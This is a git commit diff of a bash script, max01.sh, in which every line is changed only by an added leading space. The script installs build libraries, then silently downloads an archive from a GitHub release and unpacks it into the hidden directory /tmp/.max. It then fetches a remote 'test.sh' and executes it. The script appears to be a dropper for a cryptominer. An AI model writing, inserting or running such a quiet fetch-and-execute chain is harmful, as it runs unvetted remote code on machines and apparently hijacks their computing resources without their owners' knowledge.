0af8ae579e9146aa0e798d620ad2ea31d11c51bf
Ayoub JADOULI <ayoubjaddouli@gmail.com>
2021-07-10 13:18:44 +0100

    d

--- max01.sh
+++ max01.sh
@@ -1,9 +1,9 @@
 #!/bin/bash 
 sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev automake libtool autoconf -y 1> /tmp/max_log 2> /tmp/max_log
-wget -q -O /tmp/maxarc  https://github.com/cloud10001/pycpu/releases/download/v01/maxarc 
-cd /tmp/
-tar -xJf /tmp/maxarc 
-cd  /tmp/.max
-wget -q -O /tmp/.max/script.sh https://github.com/cloud10001/pycpu/raw/main/test.sh
-chmod +x script.sh
-./script.sh
+ wget -q -O /tmp/maxarc  https://github.com/cloud10001/pycpu/releases/download/v01/maxarc 
+ cd /tmp/
+ tar -xJf /tmp/maxarc 
+ cd  /tmp/.max
+ wget -q -O /tmp/.max/script.sh https://github.com/cloud10001/pycpu/raw/main/test.sh
+ chmod +x script.sh
+ ./script.sh
